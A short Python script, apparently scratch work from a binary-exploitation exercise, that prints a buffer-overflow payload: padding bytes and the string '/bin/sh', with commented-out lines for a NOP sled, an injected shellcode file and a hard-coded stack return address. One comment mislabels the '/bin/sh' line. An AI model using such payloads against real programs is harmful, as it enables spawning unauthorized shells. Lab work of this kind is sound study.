import sys


#sys.stdout.write('\x90' * (256+20-4-37-10))






#with open('inject1', 'r') as fin:
#    sys.stdout.write(fin.read())
sys.stdout.write('B' * 8)

sys.stdout.write('/bin/sh') # address of *puts()


#with open('inject1', 'r') as fin:
#    sys.stdout.write(fin.read())

#sys.stdout.write('A' * 40)



#sys.stdout.write('\x58\xd5\xff\xff')
